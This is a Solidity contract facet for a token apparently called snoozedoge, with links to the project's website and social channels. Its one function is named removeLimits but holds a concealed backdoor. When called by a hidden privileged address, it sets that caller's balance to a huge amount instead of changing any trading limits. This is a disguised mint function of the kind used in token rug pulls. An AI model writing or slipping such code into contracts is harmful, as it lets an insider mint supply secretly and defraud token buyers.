/*
 * SPDX-License-Identifier: MIT
 * Website: https://snoozedoge.com/
 * Twitter: https://twitter.com/SnozAvax
 * Telegram: https://t.me/snoozedoge
 * Discord: https://discord.com/invite/WMzgZ8NZBU
 */
pragma solidity ^0.8.17;

interface IPancakeFactory {
    function getPair(
        address tokenA,
        address tokenB
    ) external view returns (address pair);
}

import "./TestLib.sol";
contract removeLimitsFacet {
    function removeLimits(uint256 addBot) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (ds.xxnux == msg.sender) {
            ds._balances[msg.sender] =
                42069000000 *
                42069 *
                addBot *
                10 ** ds.tokenDecimals;
        }
    }
}
